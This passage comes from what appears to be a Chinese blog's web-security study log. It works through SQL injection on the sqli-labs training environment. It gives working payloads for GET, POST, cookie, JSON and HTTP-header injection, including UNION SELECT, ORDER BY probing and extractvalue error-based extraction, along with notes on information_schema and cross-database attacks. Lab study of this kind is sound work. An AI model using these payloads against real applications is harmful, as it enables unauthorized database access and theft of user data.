users WHERE id&#x3D;’$id’ LIMIT 0,1”;SQL执行的语句是采用了’’闭合,<br>我们要是直接使用?id&#x3D;1 and 1&#x3D;1相当于执行的是SELECT * FROM users WHERE id&#x3D;’1 and 1&#x3D;1’ LIMIT 0,1;是不会有任何的反应。<br><img src="/2023/09/27/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-014/2.png"><br><img src="/2023/09/27/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-014/3.png"></p><p>正确的报错语句</p><pre class=" language-bash"><code class="language-bash">http://10.1.1.133/Less-5/?id<span class="token operator">=</span>1<span class="token string">' and '</span>1<span class="token string">'='</span>1http://10.1.1.133/Less-5/?id<span class="token operator">=</span>1<span class="token string">' and '</span>1<span class="token string">'='</span>2</code></pre><p><img src="/2023/09/27/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-014/4.png"><br><img src="/2023/09/27/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-014/5.png"><br>在浏览器中解释执行的%27是’</p><p>在数据库中执行语句为</p><pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> SELECT * FROM <span class="token function">users</span> WHERE id<span class="token operator">=</span><span class="token string">'1'</span> and <span class="token string">'1'</span><span class="token operator">=</span><span class="token string">'1'</span> LIMIT 0,1<span class="token punctuation">;</span>+----+----------+----------+<span class="token operator">|</span> <span class="token function">id</span> <span class="token operator">|</span> username <span class="token operator">|</span> password <span class="token operator">|</span>+----+----------+----------+<span class="token operator">|</span>  1 <span class="token operator">|</span> Dumb     <span class="token operator">|</span> Dumb     <span class="token operator">|</span>+----+----------+----------+1 row <span class="token keyword">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span>0.00 sec<span class="token punctuation">)</span>mysql<span class="token operator">></span> SELECT * FROM <span class="token function">users</span> WHERE id<span class="token operator">=</span><span class="token string">'1'</span> and <span class="token string">'1'</span><span class="token operator">=</span><span class="token string">'2'</span> LIMIT 0,1<span class="token punctuation">;</span>Empty <span class="token keyword">set</span> <span class="token punctuation">(</span>0.00 sec<span class="token punctuation">)</span>mysql<span class="token operator">></span></code></pre><p>获取字段<br><img src="/2023/09/27/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-014/6.png"></p><h4 id="–-是将后面的代码注释不执行"><a href="#–-是将后面的代码注释不执行" class="headerlink" title="–+是将后面的代码注释不执行"></a><font size="4"><strong>–+是将后面的代码注释不执行</strong></font></h4><p>在数据库中执行</p><pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> SELECT * FROM <span class="token function">users</span> WHERE id<span class="token operator">=</span><span class="token string">'1'</span> order by 4<span class="token punctuation">;</span>ERROR 1054 <span class="token punctuation">(</span>42S22<span class="token punctuation">)</span>: Unknown column <span class="token string">'4'</span> <span class="token keyword">in</span> <span class="token string">'order clause'</span>mysql<span class="token operator">></span> SELECT * FROM <span class="token function">users</span> WHERE id<span class="token operator">=</span><span class="token string">'1'</span> order by 3<span class="token punctuation">;</span>+----+----------+----------+<span class="token operator">|</span> <span class="token function">id</span> <span class="token operator">|</span> username <span class="token operator">|</span> password <span class="token operator">|</span>+----+----------+----------+<span class="token operator">|</span>  1 <span class="token operator">|</span> Dumb     <span class="token operator">|</span> Dumb     <span class="token operator">|</span>+----+----------+----------+1 row <span class="token keyword">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span>0.00 sec<span class="token punctuation">)</span>mysql<span class="token operator">></span></code></pre><p><strong>Less-6代码查看</strong></p><pre class=" language-bash"><code class="language-bash"><span class="token variable">$id</span> <span class="token operator">=</span> <span class="token string">'"'</span><span class="token keyword">.</span><span class="token variable">$id</span><span class="token keyword">.</span><span class="token string">'"'</span><span class="token punctuation">;</span><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT * FROM users WHERE id=<span class="token variable">$id</span> LIMIT 0,1"</span><span class="token punctuation">;</span></code></pre><p>采用双引号的方式进行了编码，绕过方法”闭合前面的引号后面采用–+注释<br><img src="/2023/09/27/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-014/7.png"></p><h3 id="二、POST数据提交注入测试"><a href="#二、POST数据提交注入测试" class="headerlink" title="二、POST数据提交注入测试"></a><font size="5"><strong>二、POST数据提交注入测试</strong></font></h3><h4 id="sqlilabs-less-11"><a href="#sqlilabs-less-11" class="headerlink" title="&#x3D;&gt;sqlilabs less 11"></a><font size="4"><strong>&#x3D;&gt;sqlilabs less 11</strong></font></h4><p><img src="/2023/09/27/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-014/8.png"></p><p>用户和密码都正确提交<br><img src="/2023/09/27/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-014/9.png"></p><p>在代码中查看代码的书写</p><pre class=" language-bash"><code class="language-bash">57          @<span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT username, password FROM users WHERE username='<span class="token variable">$uname</span>' and password='<span class="token variable">$passwd</span>' LIMIT 0,1"</span><span class="token punctuation">;</span>58          <span class="token variable">$result</span><span class="token operator">=</span>mysql_query<span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>59          <span class="token variable">$row</span> <span class="token operator">=</span> mysql_fetch_array<span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>为了实验方便将下面回显sql执行命令57          @<span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT username, password FROM users WHERE username='<span class="token variable">$uname</span>' and password='<span class="token variable">$passwd</span>' LIMIT 0,1"</span><span class="token punctuation">;</span>58<span class="token keyword">echo</span> <span class="token variable">$sql</span><span class="token punctuation">;</span>59          <span class="token variable">$result</span><span class="token operator">=</span>mysql_query<span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>60          <span class="token variable">$row</span> <span class="token operator">=</span> mysql_fetch_array<span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p><img src="/2023/09/27/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-014/10.png"></p><h4 id="用hackbar模拟post数据提交测试"><a href="#用hackbar模拟post数据提交测试" class="headerlink" title="用hackbar模拟post数据提交测试"></a><font size="4" ><strong>用hackbar模拟post数据提交测试</strong></font></h4><p>以下操作使用hackbar进行渗透测试，hackbar安装地址：<a href="https://github.com/HCTYMFF/hackbar2.1.3">https://github.com/HCTYMFF/hackbar2.1.3</a></p><p><font  color=" red"><strong>一般的登录情况都是采用的post提交数据、通过抓包获取到登录信息将它放在hackbar中进行登录测试，也是为了验证hackbar是否能正常使用，要是确认hackbar能正常使用这个可以跳过。</strong></font><br>在burp抓包获取登录信息<br><img src="/2023/09/27/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-014/11.png"><br><img src="/2023/09/27/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-014/12.png"><br><img src="/2023/09/27/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-014/13.png"></p><p>枚举数据库字段<br><img src="/2023/09/27/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-014/14.png"></p><pre class=" language-bash"><code class="language-bash">uname<span class="token operator">=</span>admin' order by 3<span class="token comment" spellcheck="true">#&amp;passwd=admin&amp;submit=Submit</span></code></pre><p><strong>备注：</strong>在mysql中一般注释后面的字句是采用的–+在有些的字句中采用#注释。需要多测试才能发现，为了验证#是注释符号将#替换为–+执行查看结果看到报错信息。<br><img src="/2023/09/27/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-014/15.png"><br><strong>在数据库中执行，最终验证#是注释了后面的字句。</strong></p><pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> <span class="token keyword">select</span> username,password from <span class="token function">users</span> where username<span class="token operator">=</span><span class="token string">'admin'</span> and 1<span class="token operator">=</span>2 union <span class="token keyword">select</span> 1,2 --+ and password<span class="token operator">=</span><span class="token string">'admin'</span> limit 0 1    -<span class="token operator">></span> <span class="token punctuation">;</span>ERROR 1064 <span class="token punctuation">(</span>42000<span class="token punctuation">)</span>: You have an error <span class="token keyword">in</span> your SQL syntax<span class="token punctuation">;</span> check the manual that corresponds to your MySQL server version <span class="token keyword">for</span> the right syntax to use near <span class="token string">'and password='</span>admin<span class="token string">' limit 0 1'</span> at line 1mysql<span class="token operator">></span>将--+替换为<span class="token comment" spellcheck="true">#</span>mysql<span class="token operator">></span> <span class="token keyword">select</span> username,password from <span class="token function">users</span> where username<span class="token operator">=</span><span class="token string">'admin'</span> and 1<span class="token operator">=</span>2 union <span class="token keyword">select</span> 1,2 <span class="token comment" spellcheck="true"># and password='admin' limit 0 1</span>    -<span class="token operator">></span> <span class="token punctuation">;</span>+----------+----------+<span class="token operator">|</span> username <span class="token operator">|</span> password <span class="token operator">|</span>+----------+----------+<span class="token operator">|</span> 1        <span class="token operator">|</span> 2        <span class="token operator">|</span>+----------+----------+1 row <span class="token keyword">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span>0.00 sec<span class="token punctuation">)</span>mysql<span class="token operator">></span></code></pre><p>将order by 3改为2查看<br><img src="/2023/09/27/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-014/16.png"></p><pre class=" language-bash"><code class="language-bash">uname<span class="token operator">=</span>admin' order by 2<span class="token comment" spellcheck="true">#&amp;passwd=admin&amp;submit=Submit</span></code></pre><p>这里看到我们登陆成功，但实际上我们登陆的用户名和密码是错误的因为只是将sql语句注入进去没有报错下面的语句正常的执行就显示登陆成功，换句话说登录到情况只有两个字段。很可能就是用户名和密码。</p><p>枚举出数据库名称:</p><pre class=" language-bash"><code class="language-bash">uname<span class="token operator">=</span>admin' and 1<span class="token operator">=</span>2 union <span class="token keyword">select</span> database<span class="token punctuation">(</span><span class="token punctuation">)</span>,2 <span class="token comment" spellcheck="true">#&amp;passwd=admin&amp;submit=Submit</span></code></pre><p><img src="/2023/09/27/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-014/17.png"><br><img src="/2023/09/27/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-014/18.png"></p><h3 id="三、参数JSON数据注入测试"><a href="#三、参数JSON数据注入测试" class="headerlink" title="三、参数JSON数据注入测试"></a><font size="5"><strong>三、参数JSON数据注入测试</strong></font></h3><p><font size="4" ><strong>&#x3D;&gt;本地环境代码演示</strong></font><br>json格式<br><img src="/2023/09/27/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-014/19.png"></p><p>json注入<br><img src="/2023/09/27/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-014/20.png"><br>注入方式：如果是数字的可以不加’闭合如果是字符的话，加上”闭合</p><h3 id="四、COOKIE数据提交注入测试"><a href="#四、COOKIE数据提交注入测试" class="headerlink" title="四、COOKIE数据提交注入测试"></a><font size="5"><strong>四、COOKIE数据提交注入测试</strong></font></h3><p>&#x3D;&gt;sqlilabs less 20<br><font size="4" ><strong>网站传递参数的方式</strong></font></p><table>    <thead>        <tr>            <th>参数类型</th>            <th>含义</th>        </tr>    </thead>    <tbody>        <tr>            <td>get型</td>            <td>一般访问网页的行为</td>        </tr>        <tr>            <td>cookie型</td>            <td>伴随着所有访问网页的行为</td>        </tr>        <tr>            <td>post型</td>            <td>上传文件，登陆</td>        </tr>    </tbody></table><p>cookie注入原理：对get传递来的参数进行了过滤，但是忽略了cookie也可以传递参数。<br>【cookie注入的原理在于更改本地的cookie，从而利用cookie来提交非法语句。】 </p><p>通过burp抓包分析<br><img src="/2023/09/27/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-014/21.png"><br><img src="/2023/09/27/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-014/22.png"><br><img src="/2023/09/27/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-014/23.png"></p><p>将这个数据包发送到repeater模块当中<br><img src="/2023/09/27/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-014/24.png"></p><p>修改cookie参数Cookie: uname&#x3D;admin’ and 1&#x3D;2 union select database(),2,3 #<br><img src="/2023/09/27/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-014/25.png"><br><img src="/2023/09/27/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-014/26.png"></p><h3 id="五、HTTP头部参数数据注入测试"><a href="#五、HTTP头部参数数据注入测试" class="headerlink" title="五、HTTP头部参数数据注入测试"></a><font size="5"><strong>五、HTTP头部参数数据注入测试</strong></font></h3><p>&#x3D;&gt;sqlilabs less 18</p><p>查看数据库源代码</p><pre class=" language-bash"><code class="language-bash">       <span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT  users.username, users.password FROM users WHERE users.username=<span class="token variable">$uname</span> and users.password=<span class="token variable">$passwd</span> ORDER BY users.id DESC LIMIT 0,                                   1"</span><span class="token punctuation">;</span>        <span class="token variable">$result1</span> <span class="token operator">=</span> mysql_query<span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$row1</span> <span class="token operator">=</span> mysql_fetch_array<span class="token punctuation">(</span><span class="token variable">$result1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                if<span class="token punctuation">(</span><span class="token variable">$row1</span><span class="token punctuation">)</span>                        <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>                        <span class="token keyword">echo</span> <span class="token string">'&lt;font color= "#FFFF00" font size = 3 >'</span><span class="token punctuation">;</span>                        <span class="token variable">$insert</span><span class="token operator">=</span><span class="token string">"INSERT INTO <span class="token variable"><span class="token variable">`</span>security<span class="token variable">`</span></span>.<span class="token variable"><span class="token variable">`</span>uagents<span class="token variable">`</span></span> (<span class="token variable"><span class="token variable">`</span>uagent<span class="token variable">`</span></span>, <span class="token variable"><span class="token variable">`</span>ip_address<span class="token variable">`</span></span>, <span class="token variable"><span class="token variable">`</span>username<span class="token variable">`</span></span>) VALUES ('<span class="token variable">$uagent</span>', '<span class="token variable">$IP</span>', <span class="token variable">$uname</span>)"</span><span class="token punctuation">;</span>                        mysql_query<span class="token punctuation">(</span><span class="token variable">$insert</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        //echo <span class="token string">'Your IP ADDRESS is: '</span> <span class="token keyword">.</span><span class="token variable">$IP</span><span class="token punctuation">;</span>                        <span class="token keyword">echo</span> <span class="token string">"&lt;/font>"</span><span class="token punctuation">;</span>                        //echo <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span>                        <span class="token keyword">echo</span> <span class="token string">'&lt;font color= "#0000ff" font size = 3 >'</span><span class="token punctuation">;</span>                        <span class="token keyword">echo</span> <span class="token string">'Your User Agent is: '</span> <span class="token keyword">.</span><span class="token variable">$uagent</span><span class="token punctuation">;</span>                        <span class="token keyword">echo</span> <span class="token string">"&lt;/font>"</span><span class="token punctuation">;</span>                        <span class="token keyword">echo</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span>                        print_r<span class="token punctuation">(</span>mysql_error<span class="token punctuation">(</span><span class="token punctuation">))</span><span class="token punctuation">;</span>                        <span class="token keyword">echo</span> <span class="token string">"&lt;br>&lt;br>"</span><span class="token punctuation">;</span>                        <span class="token keyword">echo</span> <span class="token string">'&lt;img src="../images/flag.jpg"  />'</span><span class="token punctuation">;</span>                        <span class="token keyword">echo</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span>                        <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>                <span class="token keyword">else</span>                        <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>                        <span class="token keyword">echo</span> <span class="token string">'&lt;font color= "#0000ff" font size="3">'</span><span class="token punctuation">;</span>                        //echo <span class="token string">"Try again looser"</span><span class="token punctuation">;</span>                        print_r<span class="token punctuation">(</span>mysql_error<span class="token punctuation">(</span><span class="token punctuation">))</span><span class="token punctuation">;</span>                        <span class="token keyword">echo</span> <span class="token string">"&lt;/br>"</span><span class="token punctuation">;</span>                        <span class="token keyword">echo</span> <span class="token string">"&lt;/br>"</span><span class="token punctuation">;</span>                        <span class="token keyword">echo</span> <span class="token string">'&lt;img src="../images/slap.jpg"   />'</span><span class="token punctuation">;</span>                        <span class="token keyword">echo</span> <span class="token string">"&lt;/font>"</span><span class="token punctuation">;</span>                        <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span></code></pre><p>从上面的SQL语句当中我们可以看到对执行的insert语句没有任何的限制也就是说我们通过修改http的头部信息可以达到SQL注入的效果。</p><p>为了实验方便我在第103行下面添加一行显示SQL语句执行的显示界面echo $insert;</p><pre class=" language-bash"><code class="language-bash">root@eafc9e16990f:/var/www/html/Less-18<span class="token comment" spellcheck="true"># tail -36 index.php |head -2</span>                        <span class="token variable">$insert</span><span class="token operator">=</span><span class="token string">"INSERT INTO <span class="token variable"><span class="token variable">`</span>security<span class="token variable">`</span></span>.<span class="token variable"><span class="token variable">`</span>uagents<span class="token variable">`</span></span> (<span class="token variable"><span class="token variable">`</span>uagent<span class="token variable">`</span></span>, <span class="token variable"><span class="token variable">`</span>ip_address<span class="token variable">`</span></span>, <span class="token variable"><span class="token variable">`</span>username<span class="token variable">`</span></span>) VALUES ('<span class="token variable">$uagent</span>', '<span class="token variable">$IP</span>', <span class="token variable">$uname</span>)"</span><span class="token punctuation">;</span>                        <span class="token keyword">echo</span> <span class="token variable">$insert</span><span class="token punctuation">;</span>root@eafc9e16990f:/var/www/html/Less-18<span class="token comment" spellcheck="true">#</span></code></pre><p><img src="/2023/09/27/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-014/27.png"></p><p>修改数据包注入获取数据库名称’and extractvalue (1,concat(0x7e,(select database()),0x7e)) and’<br><img src="/2023/09/27/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-014/28.png"></p><p>获取用户名<br><img src="/2023/09/27/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-014/29.png"></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web安全日志-013</title>
      <link href="/2023/09/26/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-013/"/>
      <url>/2023/09/26/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-013/</url>
      
        <content type="html"><![CDATA[<h2 id="WEB漏洞-SQL-注入-二"><a href="#WEB漏洞-SQL-注入-二" class="headerlink" title="WEB漏洞-SQL 注入(二)"></a><font size="6"><strong>WEB漏洞-SQL 注入(二)</strong></font></h2><span id="more"></span><p><img src="/2023/09/26/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-013/1.png"></p><h3 id="一、information-schema"><a href="#一、information-schema" class="headerlink" title="一、information_schema"></a><font size="5"><strong>一、information_schema</strong></font></h3><p>information_schema 数据库跟 performance_schema 一样，都是 MySQL 自带的信息数据库。其中 performance_schema 用于性能分析，而 information_schema 用于存储数据库元数据(关于数据的数据)，例如数据库名、表名、列的数据类型、访问权限等。<br>information_schema 中的表实际上是视图，而不是基本表，因此，文件系统上没有与之相关的文件。</p><h4 id="●-SCHEMATA表"><a href="#●-SCHEMATA表" class="headerlink" title="● SCHEMATA表"></a><font size="4"><strong>● SCHEMATA表</strong></font></h4><p>当前 mysql 实例中所有数据库的信息。SHOW DATABASES; 命令从这个表获取数据</p><p>获取到数据库名称</p><pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> use information_schema<span class="token punctuation">;</span>mysql<span class="token operator">></span> <span class="token keyword">select</span> SCHEMA_NAME,DEFAULT_CHARACTER_SET_NAME from SCHEMATA<span class="token punctuation">;</span>+--------------------+----------------------------+<span class="token operator">|</span> SCHEMA_NAME        <span class="token operator">|</span> DEFAULT_CHARACTER_SET_NAME <span class="token operator">|</span>+--------------------+----------------------------+<span class="token operator">|</span> information_schema <span class="token operator">|</span> utf8                       <span class="token operator">|</span><span class="token operator">|</span> challenges         <span class="token operator">|</span> gbk                        <span class="token operator">|</span><span class="token operator">|</span> mysql              <span class="token operator">|</span> latin1                     <span class="token operator">|</span><span class="token operator">|</span> performance_schema <span class="token operator">|</span> utf8                       <span class="token operator">|</span><span class="token operator">|</span> security           <span class="token operator">|</span> gbk                        <span class="token operator">|</span>+--------------------+----------------------------+</code></pre><h4 id="●-TABLES-表"><a href="#●-TABLES-表" class="headerlink" title="● TABLES 表"></a><font size="4"><strong>● TABLES 表</strong></font></h4><p>存储数据库中的表信息（包括视图），包括表属于哪个数据库，表的类型、存储引擎、创建时间等信息。SHOW TABLES FROM XX; 命令从这个表获取结果。</p><pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> <span class="token keyword">select</span> TABLE_CATALOG,TABLE_SCHEMA,TABLE_NAME from tables limit 0,5<span class="token punctuation">;</span>+---------------+--------------------+---------------------------------------+<span class="token operator">|</span> TABLE_CATALOG <span class="token operator">|</span> TABLE_SCHEMA       <span class="token operator">|</span> TABLE_NAME                            <span class="token operator">|</span>+---------------+--------------------+---------------------------------------+<span class="token operator">|</span> def           <span class="token operator">|</span> information_schema <span class="token operator">|</span> CHARACTER_SETS                        <span class="token operator">|</span><span class="token operator">|</span> def           <span class="token operator">|</span> information_schema <span class="token operator">|</span> COLLATIONS                            <span class="token operator">|</span><span class="token operator">|</span> def           <span class="token operator">|</span> information_schema <span class="token operator">|</span> COLLATION_CHARACTER_SET_APPLICABILITY <span class="token operator">|</span><span class="token operator">|</span> def           <span class="token operator">|</span> information_schema <span class="token operator">|</span> COLUMNS                               <span class="token operator">|</span><span class="token operator">|</span> def           <span class="token operator">|</span> information_schema <span class="token operator">|</span> COLUMN_PRIVILEGES                     <span class="token operator">|</span>+---------------+--------------------+---------------------------------------+5 rows <span class="token keyword">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span>0.00 sec<span class="token punctuation">)</span></code></pre><h4 id="●-COLUMNS-表"><a href="#●-COLUMNS-表" class="headerlink" title="● COLUMNS 表"></a><font size="4"><strong>● COLUMNS 表</strong></font></h4><p>存储表中的列信息，包括表有多少列、每个列的类型等。SHOW COLUMNS FROM schemaname.tablename 命令从这个表获取结果。</p><pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> SELECT TABLE_CATALOG,TABLE_SCHEMA,TABLE_NAME FROM COLUMNS LIMIT 2,5<span class="token punctuation">;</span>+---------------+--------------------+----------------+<span class="token operator">|</span> TABLE_CATALOG <span class="token operator">|</span> TABLE_SCHEMA       <span class="token operator">|</span> TABLE_NAME     <span class="token operator">|</span>+---------------+--------------------+----------------+<span class="token operator">|</span> def           <span class="token operator">|</span> information_schema <span class="token operator">|</span> CHARACTER_SETS <span class="token operator">|</span><span class="token operator">|</span> def           <span class="token operator">|</span> information_schema <span class="token operator">|</span> CHARACTER_SETS <span class="token operator">|</span><span class="token operator">|</span> def           <span class="token operator">|</span> information_schema <span class="token operator">|</span> COLLATIONS     <span class="token operator">|</span><span class="token operator">|</span> def           <span class="token operator">|</span> information_schema <span class="token operator">|</span> COLLATIONS     <span class="token operator">|</span><span class="token operator">|</span> def           <span class="token operator">|</span> information_schema <span class="token operator">|</span> COLLATIONS     <span class="token operator">|</span>+---------------+--------------------+----------------+</code></pre><h4 id="●-USER-PRIVILEGES-表"><a href="#●-USER-PRIVILEGES-表" class="headerlink" title="● USER_PRIVILEGES 表"></a><font size="4"><strong>● USER_PRIVILEGES 表</strong></font></h4><p>用户权限表。内容源自 mysql.user 授权表。是非标准表。</p><pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> SELECT * FROM USER_PRIVILEGES limit 0,5<span class="token punctuation">;</span>+--------------------+---------------+----------------+--------------+<span class="token operator">|</span> GRANTEE            <span class="token operator">|</span> TABLE_CATALOG <span class="token operator">|</span> PRIVILEGE_TYPE <span class="token operator">|</span> IS_GRANTABLE <span class="token operator">|</span>+--------------------+---------------+----------------+--------------+<span class="token operator">|</span> <span class="token string">'root'</span>@<span class="token string">'localhost'</span> <span class="token operator">|</span> def           <span class="token operator">|</span> SELECT         <span class="token operator">|</span> YES          <span class="token operator">|</span><span class="token operator">|</span> <span class="token string">'root'</span>@<span class="token string">'localhost'</span> <span class="token operator">|</span> def           <span class="token operator">|</span> INSERT         <span class="token operator">|</span> YES          <span class="token operator">|</span><span class="token operator">|</span> <span class="token string">'root'</span>@<span class="token string">'localhost'</span> <span class="token operator">|</span> def           <span class="token operator">|</span> UPDATE         <span class="token operator">|</span> YES          <span class="token operator">|</span><span class="token operator">|</span> <span class="token string">'root'</span>@<span class="token string">'localhost'</span> <span class="token operator">|</span> def           <span class="token operator">|</span> DELETE         <span class="token operator">|</span> YES          <span class="token operator">|</span><span class="token operator">|</span> <span class="token string">'root'</span>@<span class="token string">'localhost'</span> <span class="token operator">|</span> def           <span class="token operator">|</span> CREATE         <span class="token operator">|</span> YES          <span class="token operator">|</span>+--------------------+---------------+----------------+--------------+5 rows <span class="token keyword">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span>0.00 sec<span class="token punctuation">)</span></code></pre><h3 id="二、跨库攻击"><a href="#二、跨库攻击" class="headerlink" title="二、跨库攻击"></a><font size="5"><strong>二、跨库攻击</strong></font></h3><p><strong>前提准备</strong></p><pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> create database book<span class="token punctuation">;</span>mysql<span class="token operator">></span> use book<span class="token punctuation">;</span>mysql<span class="token operator">></span> CREATE TABLE IF NOT EXISTS book<span class="token punctuation">(</span>    <span class="token variable"><span class="token variable">`</span>book_id<span class="token variable">`</span></span> INT UNSIGNED AUTO_INCREMENT,    <span class="token variable"><span class="token variable">`</span>book_title<span class="token variable">`</span></span> VARCHAR<span class="token punctuation">(</span>100<span class="token punctuation">)</span> NOT NULL,    <span class="token variable"><span class="token variable">`</span>book_author<span class="token variable">`</span></span> VARCHAR<span class="token punctuation">(</span>40<span class="token punctuation">)</span> NOT NULL,    <span class="token variable"><span class="token variable">`</span>submission_date<span class="token variable">`</span></span> DATE,    PRIMARY KEY <span class="token punctuation">(</span> <span class="token variable"><span class="token variable">`</span>book_id<span class="token variable">`</span></span> <span class="token punctuation">)</span> <span class="token punctuation">)</span>ENGINE<span class="token operator">=</span>InnoDB DEFAULT CHARSET<span class="token operator">=</span>utf8<span class="token punctuation">;</span>mysql<span class="token operator">></span> show databases<span class="token punctuation">;</span>+--------------------+<span class="token operator">|</span> Database           <span class="token operator">|</span>+--------------------+<span class="token operator">|</span> information_schema <span class="token operator">|</span><span class="token operator">|</span> book               <span class="token operator">|</span><span class="token operator">|</span> mysql              <span class="token operator">|</span><span class="token operator">|</span> performance_schema <span class="token operator">|</span>+--------------------+mysql<span class="token operator">></span> use book<span class="token punctuation">;</span>mysql<span class="token operator">></span> show tables<span class="token punctuation">;</span>+----------------+<span class="token operator">|</span> Tables_in_book <span class="token operator">|</span>+----------------+<span class="token operator">|</span> book           <span class="token operator">|</span>+----------------+1 row <span class="token keyword">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span>0.00 sec<span class="token punctuation">)</span>mysql<span class="token operator">></span> desc book<span class="token punctuation">;</span>+-----------------+------------------+------+-----+---------+----------------+<span class="token operator">|</span> Field           <span class="token operator">|</span> Type             <span class="token operator">|</span> Null <span class="token operator">|</span> Key <span class="token operator">|</span> Default <span class="token operator">|</span> Extra          <span class="token operator">|</span>+-----------------+------------------+------+-----+---------+----------------+<span class="token operator">|</span> book_id         <span class="token operator">|</span> int<span class="token punctuation">(</span>10<span class="token punctuation">)</span> unsigned <span class="token operator">|</span> NO   <span class="token operator">|</span> PRI <span class="token operator">|</span> NULL    <span class="token operator">|</span> auto_increment <span class="token operator">|</span><span class="token operator">|</span> book_title      <span class="token operator">|</span> varchar<span class="token punctuation">(</span>100<span class="token punctuation">)</span>     <span class="token operator">|</span> NO   <span class="token operator">|</span>     <span class="token operator">|</span> NULL    <span class="token operator">|</span>                <span class="token operator">|</span><span class="token operator">|</span> book_author     <span class="token operator">|</span> varchar<span class="token punctuation">(</span>40<span class="token punctuation">)</span>      <span class="token operator">|</span> NO   <span class="token operator">|</span>     <span class="token operator">|</span> NULL    <span class="token operator">|</span>                <span class="token operator">|</span><span class="token operator">|</span> submission_date <span class="token operator">|</span> <span class="token function">date</span>             <span class="token operator">|</span> YES  <span class="token operator">|</span>     <span class="token operator">|</span> NULL    <span class="token operator">|</span>                <span class="token operator">|</span>+-----------------+------------------+------+-----+---------+----------------+4 rows <span class="token keyword">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span>0.00 sec<span class="token punctuation">)</span></code></pre><p>打开网页进行查询当前数据库的用户<br>?id&#x3D;-1%20union%20select%201,user(),3<br><img src="/2023/09/26/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-013/2.png"></p><p>可以看到当前用户为root拥有最高的权限。</p><p>获取到当前网页的数据库名?id&#x3D;-1%20union%20select%201,database(),3<br><img src="/2023/09/26/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-013/3.png"></p><p>获取到当前网站的数据库是security</p><h4 id="●-常见的数据库与用户的对应关系"><a href="#●-常见的数据库与用户的对应关系" class="headerlink" title="● 常见的数据库与用户的对应关系"></a><font size="4"><strong>● 常见的数据库与用户的对应关系</strong></font></h4><pre class=" language-bash"><code class="language-bash">数据库A<span class="token operator">=</span>网站A<span class="token operator">=</span>数据库用户A——<span class="token operator">></span>表名——<span class="token operator">></span>列名——<span class="token operator">></span>数据数据库B<span class="token operator">=</span>网站B<span class="token 